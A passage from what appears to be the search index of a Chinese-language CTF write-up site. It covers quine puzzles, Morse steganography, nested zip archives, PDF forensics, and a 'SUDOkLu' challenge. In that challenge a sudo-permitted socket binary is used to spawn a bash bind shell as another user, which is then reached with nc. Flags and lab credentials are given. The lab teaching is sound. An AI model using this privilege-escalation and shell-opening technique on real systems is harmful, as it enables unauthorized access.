\u8fdb\u884c\u66ff\u6362\uff0c\u5e76\u8c03\u6574\u884c\u8ddd\uff0c\u4f7f\u7528\u7684\u662f\u516b\u53f7\u5b57\u9ed1\u4f53\uff0c\u626b\u63cf\u4e8c\u7ef4\u7801\u5373\u53ef\u83b7\u5f97 flag","title":"\u89e3\u9898\u601d\u8def"},{"location":"misc/self_repeating_repeater/","text":"\u9898\u76ee \u00b6 \u80fd\u591f\u590d\u8bfb\u5176\u4ed6\u7a0b\u5e8f\u8f93\u51fa\u7684\u7a0b\u5e8f\u53ea\u662f\u666e\u901a\u7684\u590d\u8bfb\u673a\u3002 \u9876\u5c16\u7684\u590d\u8bfb\u673a\u8fd8\u5e94\u8be5\u80fd\u590d\u8bfb\u51fa\u81ea\u5df1\u7684\u6e90\u4ee3\u7801\u3002 \u4ec0\u4e48\u662f\u56fd\u9645\u590d\u8bfb\u673a\u554a\uff08\u6218\u672f\u540e\u4ef0\uff09 \u4f60\u73b0\u5728\u9700\u8981\u7f16\u5199\u4e24\u4e2a\u53ea\u6709\u4e00\u884c Python \u4ee3\u7801\u7684\u9876\u5c16\u590d\u8bfb\u673a\uff1a \u5176\u4e2d\u4e00\u4e2a\u8981\u8f93\u51fa\u4ee3\u7801\u672c\u8eab\u7684\u9006\u5e8f\uff08\u5373\u6240\u6709\u5b57\u7b26\u4ece\u540e\u5411\u524d\u4f9d\u6b21\u8f93\u51fa\uff09 \u53e6\u4e00\u4e2a\u662f\u8f93\u51fa\u4ee3\u7801\u672c\u8eab\u7684 sha256 \u54c8\u5e0c\u503c\uff0c\u5341\u516d\u8fdb\u5236\u5c0f\u5199 Quine \u00b6 \u81ea\u4ea7\u751f\u7a0b\u5e8f\uff0c\u6307\u7684\u662f\u65e0\u8f93\u5165\u4e14\u8f93\u51fa\u7ed3\u679c\u4e3a\u7a0b\u5e8f\u81ea\u8eab\u6e90\u7801\u7684\u7a0b\u5e8f \u539f\u7406 \u00b6 \u7a0b\u5e8f\u5305\u542b\u4e24\u4e2a\u90e8\u5206\uff1a\u7528\u4e8e\u6267\u884c\u8f93\u51fa\u7684\u4ee3\u7801 A \u548c\u8868\u793a\u4ee3\u7801\u6587\u672c\u7684\u6570\u636e B \u4ee3\u7801 A \u6253\u5370\u8f93\u51fa\u6570\u636e B\uff0c\u6570\u636e B \u4e2d\u4e5f\u5305\u542b\u4ee3\u7801 A Quine in Python \u00b6 repr() \uff1a\u8fd4\u56de\u63cf\u8ff0\u5bf9\u8c61\u7684\u5b57\u7b26\u4e32\u3002\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e2d\uff0c\u8f6c\u6362\u8bf4\u660e\u7b26 %r \u4ee3\u8868 repr() 1 2 3 4 5 6 >>> s = 'Hello' >>> repr ( s ) \"'Hello'\" >>> l = [ 1 , 2 , 'a' ] >>> repr ( l ) \"[1, 2, 'a']\" \u6700\u77ed\u7684 Python \u81ea\u4ea7\u751f\u7a0b\u5e8f\uff08\u672a\u8003\u8651\u56de\u8f66\uff09 1 s = 's= %r ;print(s %% s)' ; print ( s % s ) \u53c2\u8003\u8d44\u6599 \u00b6 \u81ea\u4ea7\u751f\u7a0b\u5e8f - \u7ef4\u57fa\u767e\u79d1\uff0c\u81ea\u7531\u7684\u767e\u79d1\u5168\u4e66 How to write your first Quine program | by David Bertoldi | Towards Data Science \u8f93\u51fa\u4ee3\u7801\u672c\u8eab\u7684\u9006\u5e8f \u00b6 \u6ce8\u610f\u8981\u8003\u8651\u56de\u8f66 1 s = \"s= %r ;print((s %% s)[::-1],end='')\" ; print (( s % s )[:: - 1 ], end = '' ) \u8f93\u51fa\u4ee3\u7801\u672c\u8eab\u7684 SHA256 \u54c8\u5e0c\u503c \u00b6 \u5b57\u7b26\u4e32 s \u7684\u5185\u5bb9\u53c2\u8003\u6267\u884c\u8f93\u51fa\u7684\u4ee3\u7801 1 s = \"s= %r ;import hashlib;print(hashlib.sha256((s %% s).encode()).hexdigest(),end='')\" ; import hashlib ; print ( hashlib . sha256 (( s % s ) . encode ()) . hexdigest (), end = '' )","title":"\u81ea\u590d\u8bfb\u7684\u590d\u8bfb\u673a"},{"location":"misc/self_repeating_repeater/#_1","text":"\u80fd\u591f\u590d\u8bfb\u5176\u4ed6\u7a0b\u5e8f\u8f93\u51fa\u7684\u7a0b\u5e8f\u53ea\u662f\u666e\u901a\u7684\u590d\u8bfb\u673a\u3002 \u9876\u5c16\u7684\u590d\u8bfb\u673a\u8fd8\u5e94\u8be5\u80fd\u590d\u8bfb\u51fa\u81ea\u5df1\u7684\u6e90\u4ee3\u7801\u3002 \u4ec0\u4e48\u662f\u56fd\u9645\u590d\u8bfb\u673a\u554a\uff08\u6218\u672f\u540e\u4ef0\uff09 \u4f60\u73b0\u5728\u9700\u8981\u7f16\u5199\u4e24\u4e2a\u53ea\u6709\u4e00\u884c Python \u4ee3\u7801\u7684\u9876\u5c16\u590d\u8bfb\u673a\uff1a \u5176\u4e2d\u4e00\u4e2a\u8981\u8f93\u51fa\u4ee3\u7801\u672c\u8eab\u7684\u9006\u5e8f\uff08\u5373\u6240\u6709\u5b57\u7b26\u4ece\u540e\u5411\u524d\u4f9d\u6b21\u8f93\u51fa\uff09 \u53e6\u4e00\u4e2a\u662f\u8f93\u51fa\u4ee3\u7801\u672c\u8eab\u7684 sha256 \u54c8\u5e0c\u503c\uff0c\u5341\u516d\u8fdb\u5236\u5c0f\u5199","title":"\u9898\u76ee"},{"location":"misc/self_repeating_repeater/#quine","text":"\u81ea\u4ea7\u751f\u7a0b\u5e8f\uff0c\u6307\u7684\u662f\u65e0\u8f93\u5165\u4e14\u8f93\u51fa\u7ed3\u679c\u4e3a\u7a0b\u5e8f\u81ea\u8eab\u6e90\u7801\u7684\u7a0b\u5e8f","title":"Quine"},{"location":"misc/self_repeating_repeater/#_2","text":"\u7a0b\u5e8f\u5305\u542b\u4e24\u4e2a\u90e8\u5206\uff1a\u7528\u4e8e\u6267\u884c\u8f93\u51fa\u7684\u4ee3\u7801 A \u548c\u8868\u793a\u4ee3\u7801\u6587\u672c\u7684\u6570\u636e B \u4ee3\u7801 A \u6253\u5370\u8f93\u51fa\u6570\u636e B\uff0c\u6570\u636e B \u4e2d\u4e5f\u5305\u542b\u4ee3\u7801 A","title":"\u539f\u7406"},{"location":"misc/self_repeating_repeater/#quine-in-python","text":"repr() \uff1a\u8fd4\u56de\u63cf\u8ff0\u5bf9\u8c61\u7684\u5b57\u7b26\u4e32\u3002\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e2d\uff0c\u8f6c\u6362\u8bf4\u660e\u7b26 %r \u4ee3\u8868 repr() 1 2 3 4 5 6 >>> s = 'Hello' >>> repr ( s ) \"'Hello'\" >>> l = [ 1 , 2 , 'a' ] >>> repr ( l ) \"[1, 2, 'a']\" \u6700\u77ed\u7684 Python \u81ea\u4ea7\u751f\u7a0b\u5e8f\uff08\u672a\u8003\u8651\u56de\u8f66\uff09 1 s = 's= %r ;print(s %% s)' ; print ( s % s )","title":"Quine in Python"},{"location":"misc/self_repeating_repeater/#_3","text":"\u81ea\u4ea7\u751f\u7a0b\u5e8f - \u7ef4\u57fa\u767e\u79d1\uff0c\u81ea\u7531\u7684\u767e\u79d1\u5168\u4e66 How to write your first Quine program | by David Bertoldi | Towards Data Science","title":"\u53c2\u8003\u8d44\u6599"},{"location":"misc/self_repeating_repeater/#_4","text":"\u6ce8\u610f\u8981\u8003\u8651\u56de\u8f66 1 s = \"s= %r ;print((s %% s)[::-1],end='')\" ; print (( s % s )[:: - 1 ], end = '' )","title":"\u8f93\u51fa\u4ee3\u7801\u672c\u8eab\u7684\u9006\u5e8f"},{"location":"misc/self_repeating_repeater/#sha256","text":"\u5b57\u7b26\u4e32 s \u7684\u5185\u5bb9\u53c2\u8003\u6267\u884c\u8f93\u51fa\u7684\u4ee3\u7801 1 s = \"s= %r ;import hashlib;print(hashlib.sha256((s %% s).encode()).hexdigest(),end='')\" ; import hashlib ; print ( hashlib . sha256 (( s % s ) . encode ()) . hexdigest (), end = '' )","title":"\u8f93\u51fa\u4ee3\u7801\u672c\u8eab\u7684 SHA256 \u54c8\u5e0c\u503c"},{"location":"misc/stegano50/","text":"\u89e3\u9898\u601d\u8def \u00b6 \u662f\u4e00\u4e2a PDF \u6587\u4ef6 \u5168\u9009\uff0c\u590d\u5236\uff0c\u7c98\u8d34\u5230\u6587\u672c\u7f16\u8f91\u5668 NoFlagHere! NoFlagHere! NoFlagHere! XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX Close - but still not here ! BABA BBB BA BBA ABA AB B AAB ABAA AB B AA BBB BA AAA BBAABB AABA ABAA AB BBA BBBAAA ABBBB BA AAAB ABBBB AAAAA ABBBB BAAA ABAA AAABB BB AAABB AAAAA AAAAA AAAAB BBA AAABB Lorem ipsum dolor sit amet, consectetur adipiscing elit. Cras ... \u6ce8\u610f\u5230\u4e00\u4e2a\u4ec5\u7531 A \u548c B \u7ec4\u6210\u7684\u6709\u89c4\u5f8b\u7684\u5b57\u7b26\u4e32\uff0c\u957f\u5ea6\u4ece 1 \u5230 6 \u4e0d\u7b49\uff0c\u63a8\u6d4b\u4e3a\u6469\u5c14\u65af\u7535\u7801 \u5c06 A \u66ff\u6362\u4e3a . \uff0cB \u66ff\u6362\u4e3a - \uff0c\u53ef\u89e3\u7801\u5f97\u6709\u610f\u4e49\u7684\u7ed3\u679c\uff1a CONGRATULATIONS,FLAG:1NV151BL3M3554G3 1 -.-. --- -. --. .-. .- - ..- .-.. .- - .. --- -. ... --..-- ..-. .-.. .- --. ---... .---- -. ...- .---- ..... .---- -... .-.. ...-- -- ...-- ..... ..... ....- --. ...-- \u63a8\u8350\u5de5\u5177 \u00b6 Morse Code Translator - Morse Decoder - \u53ef\u76f4\u63a5\u5728\u9009\u9879\u4e2d\u8bbe\u7f6e - \u548c . \u7684\u66ff\u4ee3\u5b57\u7b26","title":"Stegano50"},{"location":"misc/stegano50/#_1","text":"\u662f\u4e00\u4e2a PDF \u6587\u4ef6 \u5168\u9009\uff0c\u590d\u5236\uff0c\u7c98\u8d34\u5230\u6587\u672c\u7f16\u8f91\u5668 NoFlagHere! NoFlagHere! NoFlagHere! XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX Close - but still not here ! BABA BBB BA BBA ABA AB B AAB ABAA AB B AA BBB BA AAA BBAABB AABA ABAA AB BBA BBBAAA ABBBB BA AAAB ABBBB AAAAA ABBBB BAAA ABAA AAABB BB AAABB AAAAA AAAAA AAAAB BBA AAABB Lorem ipsum dolor sit amet, consectetur adipiscing elit. Cras ... \u6ce8\u610f\u5230\u4e00\u4e2a\u4ec5\u7531 A \u548c B \u7ec4\u6210\u7684\u6709\u89c4\u5f8b\u7684\u5b57\u7b26\u4e32\uff0c\u957f\u5ea6\u4ece 1 \u5230 6 \u4e0d\u7b49\uff0c\u63a8\u6d4b\u4e3a\u6469\u5c14\u65af\u7535\u7801 \u5c06 A \u66ff\u6362\u4e3a . \uff0cB \u66ff\u6362\u4e3a - \uff0c\u53ef\u89e3\u7801\u5f97\u6709\u610f\u4e49\u7684\u7ed3\u679c\uff1a CONGRATULATIONS,FLAG:1NV151BL3M3554G3 1 -.-. --- -. --. .-. .- - ..- .-.. .- - .. --- -. ... --..-- ..-. .-.. .- --. ---... .---- -. ...- .---- ..... .---- -... .-.. ...-- -- ...-- ..... ..... ....- --. ...--","title":"\u89e3\u9898\u601d\u8def"},{"location":"misc/stegano50/#_2","text":"Morse Code Translator - Morse Decoder - \u53ef\u76f4\u63a5\u5728\u9009\u9879\u4e2d\u8bbe\u7f6e - \u548c . \u7684\u66ff\u4ee3\u5b57\u7b26","title":"\u63a8\u8350\u5de5\u5177"},{"location":"misc/sudoklu/","tags":["sudo","socket"],"text":"#sudo #socket .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } \u9898\u76ee \u00b6 This is a warmup to get you going. Your task is to read /home/privilegeduser/flag.txt . For our new commers, the title might steer you in the right direction ;). Good luck! Credentials: user:password123 \u89e3\u9898\u601d\u8def \u00b6 \u67e5\u770b\u80fd\u591f\u4f7f\u7528 sudo \u6267\u884c\u7684\u547d\u4ee4 1 2 3 4 5 6 7 $ sudo -l Matching Defaults entries for user on sudoklu: env_reset, mail_badpass, secure_path = /usr/local/sbin \\: /usr/local/bin \\: /usr/sbin \\: /usr/bin \\: /sbin \\: /bin \\: /snap/bin, use_pty User user may run the following commands on sudoklu: ( privilegeduser ) NOPASSWD: /usr/bin/socket \u5f00\u542f\u76d1\u542c 1 2 3 4 $ socket Usage: socket [ -bclqrvw ] [ -B local ip ] [ -p prog ] {{ -s | host } port | [ -s ] /path } $ sudo -u privilegeduser socket -v -p bash -s 8081 inet: listening on port 8081 \u53e6\u8d77\u4e00\u4e2a\u7ec8\u7aef\u8fde\u63a5 1 2 3 4 5 $ nc localhost 8081 whoami privilegeduser cat ~/flag.txt Hero { ch3ck_f0r_m1sc0nf1gur4t1on5 } \u53c2\u8003\u8d44\u6599 \u00b6 linux - sudo access a file without sudo password - Super User","title":"SUDOkLu"},{"location":"misc/sudoklu/#_1","text":"This is a warmup to get you going. Your task is to read /home/privilegeduser/flag.txt . For our new commers, the title might steer you in the right direction ;). Good luck! Credentials: user:password123","title":"\u9898\u76ee"},{"location":"misc/sudoklu/#_2","text":"\u67e5\u770b\u80fd\u591f\u4f7f\u7528 sudo \u6267\u884c\u7684\u547d\u4ee4 1 2 3 4 5 6 7 $ sudo -l Matching Defaults entries for user on sudoklu: env_reset, mail_badpass, secure_path = /usr/local/sbin \\: /usr/local/bin \\: /usr/sbin \\: /usr/bin \\: /sbin \\: /bin \\: /snap/bin, use_pty User user may run the following commands on sudoklu: ( privilegeduser ) NOPASSWD: /usr/bin/socket \u5f00\u542f\u76d1\u542c 1 2 3 4 $ socket Usage: socket [ -bclqrvw ] [ -B local ip ] [ -p prog ] {{ -s | host } port | [ -s ] /path } $ sudo -u privilegeduser socket -v -p bash -s 8081 inet: listening on port 8081 \u53e6\u8d77\u4e00\u4e2a\u7ec8\u7aef\u8fde\u63a5 1 2 3 4 5 $ nc localhost 8081 whoami privilegeduser cat ~/flag.txt Hero { ch3ck_f0r_m1sc0nf1gur4t1on5 }","title":"\u89e3\u9898\u601d\u8def"},{"location":"misc/sudoklu/#_3","text":"linux - sudo access a file without sudo password - Super User","title":"\u53c2\u8003\u8d44\u6599"},{"location":"misc/targz_y1ng/","text":"\u9898\u76ee \u00b6 \u54ce\uff1f \u6211\u7684 tar zxvf \u600e\u4e48\u4e0d\u597d\u4f7f\u4e86\uff1f \u89e3\u538b\u5bc6\u7801\u4e0d\u9700\u8981\u7206\u7834 \u89e3\u9898\u601d\u8def \u00b6 file \u67e5\u770b\uff0c\u662f ZIP \u6587\u4ef6\uff0c\u6240\u4ee5 tar zxvf \u4e0d\u597d\u4f7f(\u014f\u03c9\u014f) 1 2 $ file hW1ES89jF.tar.gz hW1ES89jF.tar.gz: Zip archive data, at least v2.0 to extract \u89e3\u538b\u6587\u4ef6\u9700\u8981\u8f93\u5165\u5bc6\u7801\uff0c\u4f46 \u89e3\u538b\u5bc6\u7801\u4e0d\u9700\u8981\u7206\u7834 \u3010?\u3011\u2026\u2026\u96be\u9053\u662f\u4f2a\u52a0\u5bc6\uff1f\u67e5\u770b\u5168\u5c40\u65b9\u5f0f\u4f4d\u6807\u8bb0\uff0c\u503c\u4e3a 0x0009 \uff0c\u662f\u771f\u52a0\u5bc6 \u76ee\u5149\u79fb\u5411\u4e86\u53ef\u7591\u7684\u6587\u4ef6\u540d (\u03a6\u02cb\u03c9\u02ca\u03a6) Bingo~\u6587\u4ef6\u540d\u5c31\u662f\u89e3\u538b\u5bc6\u7801\u3002\u7136\u800c\u89e3\u538b\u4e86\u8fd9\u4e2a\u538b\u7f29\u5305\u540e\u5f97\u5230\u4e86\u65b0\u7684\u538b\u7f29\u5305\uff0c\u89e3\u538b\u65b0\u7684\u538b\u7f29\u5305\u540e\u53c8\u5f97\u5230\u4e86\u4e00\u4e2a\u65b0\u7684\u538b\u7f29\u5305\u2026\u2026(\u03a6\u76bf\u03a6\u256c) 1 2 3 4 5 6 7 8 9 10 11 12 #!/usr/bin/env bash zfile = \"hW1ES89jF.tar.gz\" pass = \" ${ zfile %%.* } \" ftype = $( file --mime-type \" $zfile \" | grep -P '(?=[^/]*$).*' -o ) while [ 'zip' == \" $ftype \" ] ; do old = \" $zfile \" zfile = $( unzip -P \" $pass \" \" $zfile \" | grep -P '((?<=(inflating: ))|(?<=(extracting: )))(.*)\\b' -o ) pass = \" ${ zfile %%.* } \" ftype = $( file --mime-type \" $zfile \" | grep -P '(?=[^/]*$).*' -o ) rm \" $old \" done \u6700\u540e\u5f97\u5230\u4e00\u4e2a flag \u6587\u4ef6 1 2 3 4 $ file flag flag: ASCII text, with no line terminators $ cat flag BJD { wow_you_can_rea11y_dance } \u53c2\u8003\u8d44\u6599 \u00b6 compression - ZIP file decompression inflating vs extracting - Super User","title":"TARGZ-y1ng"},{"location":"misc/targz_y1ng/#_1","text":"\u54ce\uff1f \u6211\u7684 tar zxvf \u600e\u4e48\u4e0d\u597d\u4f7f\u4e86\uff1f \u89e3\u538b\u5bc6\u7801\u4e0d\u9700\u8981\u7206\u7834","title":"\u9898\u76ee"},{"location":"misc/targz_y1ng/#_2","text":"file \u67e5\u770b\uff0c\u662f ZIP \u6587\u4ef6\uff0c\u6240\u4ee5 tar zxvf \u4e0d\u597d\u4f7f(\u014f\u03c9\u014f) 1 2 $ file hW1ES89jF.tar.gz hW1ES89jF.tar.gz: Zip archive data, at least v2.0 to extract \u89e3\u538b\u6587\u4ef6\u9700\u8981\u8f93\u5165\u5bc6\u7801\uff0c\u4f46 \u89e3\u538b\u5bc6\u7801\u4e0d\u9700\u8981\u7206\u7834 \u3010?\u3011\u2026\u2026\u96be\u9053\u662f\u4f2a\u52a0\u5bc6\uff1f\u67e5\u770b\u5168\u5c40\u65b9\u5f0f\u4f4d\u6807\u8bb0\uff0c\u503c\u4e3a 0x0009 \uff0c\u662f\u771f\u52a0\u5bc6 \u76ee\u5149\u79fb\u5411\u4e86\u53ef\u7591\u7684\u6587\u4ef6\u540d (\u03a6\u02cb\u03c9\u02ca\u03a6) Bingo~\u6587\u4ef6\u540d\u5c31\u662f\u89e3\u538b\u5bc6\u7801\u3002\u7136\u800c\u89e3\u538b\u4e86\u8fd9\u4e2a\u538b\u7f29\u5305\u540e\u5f97\u5230\u4e86\u65b0\u7684\u538b\u7f29\u5305\uff0c\u89e3\u538b\u65b0\u7684\u538b\u7f29\u5305\u540e\u53c8\u5f97\u5230\u4e86\u4e00\u4e2a\u65b0\u7684\u538b\u7f29\u5305\u2026\u2026(\u03a6\u76bf\u03a6\u256c) 1 2 3 4 5 6 7 8 9 10 11 12 #!/usr/bin/env bash zfile = \"hW1ES89jF.tar.gz\" pass = \" ${ zfile %%.* } \" ftype = $( file --mime-type \" $zfile \" | grep -P '(?=[^/]*$).*' -o ) while [ 'zip' == \" $ftype \" ] ; do old = \" $zfile \" zfile = $( unzip -P \" $pass \" \" $zfile \" | grep -P '((?<=(inflating: ))|(?<=(extracting: )))(.*)\\b' -o ) pass = \" ${ zfile %%.* } \" ftype = $( file --mime-type \" $zfile \" | grep -P '(?=[^/]*$).*' -o ) rm \" $old \" done \u6700\u540e\u5f97\u5230\u4e00\u4e2a flag \u6587\u4ef6 1 2 3 4 $ file flag flag: ASCII text, with no line terminators $ cat flag BJD { wow_you_can_rea11y_dance }","title":"\u89e3\u9898\u601d\u8def"},{"location":"misc/targz_y1ng/#_3","text":"compression - ZIP file decompression inflating vs extracting - Super User","title":"\u53c2\u8003\u8d44\u6599"},{"location":"misc/teg_rads/","text":"\u9898\u76ee \u00b6 Most of the times, what you seek is deep within the user. It starts with a writer, carries on with an actor and ends with a producer. \u89e3\u9898\u601d\u8def \u00b6 \u6253\u5f00 fdp.pdf \uff0c\u5168\u9009\u590d\u5236\u7c98\u8d34 1 2 3 4 5 dsc { f0r3n51x_15_fun } dsc { n0t_h3r3_31th3r } 1 # not here dsc { n1c3_try } 1 dsc { f00t_n0t3 } would just be too obvious # foot note \u770b\u4e0a\u53bb dsc{f0r3n51x_15_fun} \u662f FLag \u5462\uff0c\u63d0\u4ea4 -> Incorrect (\u2565\u03c9\u2565) \u597d\u53ed\uff0c\u6839\u636e\u9898\u76ee writer \u3001 actor \u3001 producer \u4e4b\u7c7b\u7684\u770b\u770b\u6587\u4ef6\u5c5e\u6027\uff0c\u627e\u5230\u5e94\u8be5\u662f Flag \u7684\u7b2c\u4e09\u90e8\u5206\uff0cBase64 \u89e3\u7801\u5f97\uff1a b4nn3d} \u63a5\u4e0b\u6765\u4f7f\u7528 010 Editor \u770b\u770b\u5427\uff0c\u9664\u4e86\u63cf\u8ff0\u4fe1\u606f\u5916\uff0c\u9996\u5148\u770b\u5230 1 2 3 % Here's the first part of the flag: % DONT ESCAPE FROM JAVASCRIPT % `%64%73%63%7B%70%75%62%6C%31%63_` URL \u89e3\u7801\u5f97 Flag \u7684\u7b2c\u4e00\u90e8\u5206 dsc{publ1c_ \uff0c\u4ee5\u6b64\u7c7b\u63a8\uff0cCTRL + F \u627e\u627e second \uff0c\u6ca1\u6709\u7ed3\u679c... \u7ee7\u7eed\u6d4f\u89c8\uff0c\u770b\u5230\u6ce8\u91ca // There are 5 pieces to the puzzle \uff0c\u6240\u4ee5 Flag \u88ab\u62c6\u6210\u4e86 \u4e94\u6bb5 \u54af\uff1f \u4e00\u76f4\u770b\u5230\u6587\u4ef6\u672b\u5c3e\uff0c(\u03a6\u02cb\u0434\u02ca\u03a6) \u8fc7\u5206\uff01\u7b2c\u4e8c\u90e8\u5206\u5c45\u7136\u8fd9\u4e48\u7ed9\uff01 1 % Now you prolly tried ctrl+f but i wouldnt make it that easy, here ya go for slice #2 - (23958575899).toString(35) + String.fromCharCode(0x5F) \u76f4\u63a5 \u5f00\u53d1\u8005\u5de5\u5177->\u63a7\u5236\u53f0 \u8dd1\u4e00\u4e0b\u5c31\u884c\uff1a d15pl4y_ \u63a5\u4e0b\u6765\u5c31\u8fd8\u5dee\u4e24\u4e2a\u90e8\u5206\u5566\uff01\u5728 Flag \u7b2c\u4e8c\u90e8\u5206\u7684\u63d0\u793a\u4e0b\u9762\u7d27\u8ddf\u4e86 PK \u538b\u7f29\u5305\u5934\uff0c\u8d76\u7d27 binwalk \u770b\u770b 1 2 3 4 5 6 7 8 $ binwalk fdp.pdf DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 PDF document, version: \"1.4\" 48629 0xBDF5 Zip archive data, at least v1.0 to extract, name: sk1/ 48691 0xBE33 Zip archive data, at least v2.0 to extract, compressed size: 95 , uncompressed size: 108 , name: sk1/p4.txt 49008 0xBF70 End of Zip archive, footer length: 22 \u5206\u79bb\u538b\u7f29\u5305\u89e3\u538b\u5f97\u5230 p4.txt \uff0c\u90a3\u5e94\u8be5\u662f Flag \u7b2c\u56db\u90e8\u5206\u4e86 1 2 3 4 5 6 7 8 9 // p4.txt Caesar wasn ' t smart enough . He got outsmarted by Brutus lmao . The key is our creator The result is fq3gq10n_ // \u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801 // creator\uff1a alexa // \u89e3\u5bc6\u5f97 ff3ct10n_ \u6700\u540e\u518d\u6b21\u68c0\u67e5 PDF \u6587\u4ef6\uff0c\u53d1\u73b0\u4e00\u4e32\u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32\u3002\u5f00\u5934\u8865 0 \u51d1\u8db3 8 \u4f4d\u540e\u518d\u8f6c\u5b57\u7b26\u5f97\u5230\uff1a 0f_ 1 2 3 4 5 <rdf:Description rdf:about='' xmlns:pdf='http://ns.adobe.com/pdf/1.3/'> <pdf:Author>Leplin</pdf:Author> <pdf:Keywords>110000 1100110 1011111</pdf:Keywords> </rdf:Description> \u63a5\u4e0b\u6765\u5c31\u662f\u62fc\u63a5\u95ee\u9898\uff01\u7531 p4.txt \u6587\u4ef6\u540d\u63a8\u6d4b\u5e94\u8be5\u662f\u5728\u7b2c\u56db\u90e8\u5206\uff0c\u5e26\u6709 {} \u7684\u90e8\u5206\u4f4d\u7f6e\u5e94\u8be5\u4e5f\u4e0d\u80fd\u968f\u610f\u6539\u53d8\uff0c\u90a3\u4e48 0f_ \u624d\u662f\u5b9e\u9645\u7684\u7b2c\u4e09\u90e8\u5206\uff0c\u800c b4nn3d} \u662f\u5b9e\u9645\u7684\u7b2c\u4e94\u90e8\u5206 \u6700\u7ec8 Flag\uff1a dsc{publ1c_d15pl4y_0f_ff3ct10n_b4nn3d}","title":"Teg Rads"},{"location":"misc/teg_rads/#_1","text":"Most of the times, what you seek is deep within the user. It starts with a writer, carries on with an actor and ends with a producer.","title":"\u9898\u76ee"},{"location":"misc/teg_rads/#_2","text":"\u6253\u5f00 fdp.pdf \uff0c\u5168\u9009\u590d\u5236\u7c98\u8d34 1 2 3 4 5 dsc { f0r3n51x_15_fun } dsc { n0t_h3r3_31th3r } 1 # not here dsc { n1c3_try } 1 dsc { f00t_n0t3 } would just be too obvious # foot note \u770b\u4e0a\u53bb dsc{f0r3n51x_15_fun} \u662f FLag \u5462\uff0c\u63d0\u4ea4 -> Incorrect (\u2565\u03c9\u2565) \u597d\u53ed\uff0c\u6839\u636e\u9898\u76ee writer \u3001 actor \u3001 producer \u4e4b\u7c7b\u7684\u770b\u770b\u6587\u4ef6\u5c5e\u6027\uff0c\u627e\u5230\u5e94\u8be5\u662f Flag \u7684\u7b2c\u4e09\u90e8\u5206\uff0cBase64 \u89e3\u7801\u5f97\uff1a b4nn3d} \u63a5\u4e0b\u6765\u4f7f\u7528 010 Editor \u770b\u770b\u5427\uff0c\u9664\u4e86\u63cf\u8ff0\u4fe1\u606f\u5916\uff0c\u9996\u5148\u770b\u5230 1 2 3 % Here's the first part of the flag: % DONT ESCAPE FROM JAVASCRIPT % `%64%73%63%7B%70%75%62%6C%31%63_` URL \u89e3\u7801\u5f97 Flag \u7684\u7b2c\u4e00\u90e8\u5206 dsc{publ1c_ \uff0c\u4ee5\u6b64\u7c7b\u63a8\uff0cCTRL + F \u627e\u627e second \uff0c\u6ca1\u6709\u7ed3\u679c... \u7ee7\u7eed\u6d4f\u89c8\uff0c\u770b\u5230\u6ce8\u91ca // There are 5 pieces to the puzzle \uff0c\u6240\u4ee5 Flag \u88ab\u62c6\u6210\u4e86 \u4e94\u6bb5 \u54af\uff1f \u4e00\u76f4\u770b\u5230\u6587\u4ef6\u672b\u5c3e\uff0c(\u03a6\u02cb\u0434\u02ca\u03a6) \u8fc7\u5206\uff01\u7b2c\u4e8c\u90e8\u5206\u5c45\u7136\u8fd9\u4e48\u7ed9\uff01 1 % Now you prolly tried ctrl+f but i wouldnt make it that easy, here ya go for slice #2 - (23958575899).toString(35) + String.fromCharCode(0x5F) \u76f4\u63a5 \u5f00\u53d1\u8005\u5de5\u5177->\u63a7\u5236\u53f0 \u8dd1\u4e00\u4e0b\u5c31\u884c\uff1a d15pl4y_ \u63a5\u4e0b\u6765\u5c31\u8fd8\u5dee\u4e24\u4e2a\u90e8\u5206\u5566\uff01\u5728 Flag \u7b2c\u4e8c\u90e8\u5206\u7684\u63d0\u793a\u4e0b\u9762\u7d27\u8ddf\u4e86 PK \u538b\u7f29\u5305\u5934\uff0c\u8d76\u7d27 binwalk \u770b\u770b 1 2 3 4 5 6 7 8 $ binwalk fdp.pdf DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 PDF document, version: \"1.4\" 48629 0xBDF5 Zip archive data, at least v1.0 to extract, name: sk1/ 48691 0xBE33 Zip archive data, at least v2.0 to extract, compressed size: 95 , uncompressed size: 108 , name: sk1/p4.txt 49008 0xBF70 End of Zip archive, footer length: 22 \u5206\u79bb\u538b\u7f29\u5305\u89e3\u538b\u5f97\u5230 p4.txt \uff0c\u90a3\u5e94\u8be5\u662f Flag \u7b2c\u56db\u90e8\u5206\u4e86 1 2 3 4 5 6 7 8 9 // p4.txt Caesar wasn ' t smart enough . He got outsmarted by Brutus lmao . The key is our creator The result is fq3gq10n_ // \u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801 // creator\uff1a alexa // \u89e3\u5bc6\u5f97 ff3ct10n_ \u6700\u540e\u518d\u6b21\u68c0\u67e5 PDF \u6587\u4ef6\uff0c\u53d1\u73b0\u4e00\u4e32\u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32\u3002\u5f00\u5934\u8865 0 \u51d1\u8db3 8 \u4f4d\u540e\u518d\u8f6c\u5b57\u7b26\u5f97\u5230\uff1a 0f_ 1 2 3 4 5 <rdf:Description rdf:about='' xmlns:pdf='http://ns.adobe.com/pdf/1.3/'> <pdf:Author>Leplin</pdf:Author> <pdf:Keywords>110000 1100110 1011111</pdf:Keywords> </rdf:Description> \u63a5\u4e0b\u6765\u5c31\u662f\u62fc\u63a5\u95ee\u9898\uff01\u7531 p4.txt \u6587\u4ef6\u540d\u63a8\u6d4b\u5e94\u8be5\u662f\u5728\u7b2c\u56db\u90e8\u5206\uff0c\u5e26\u6709 {} 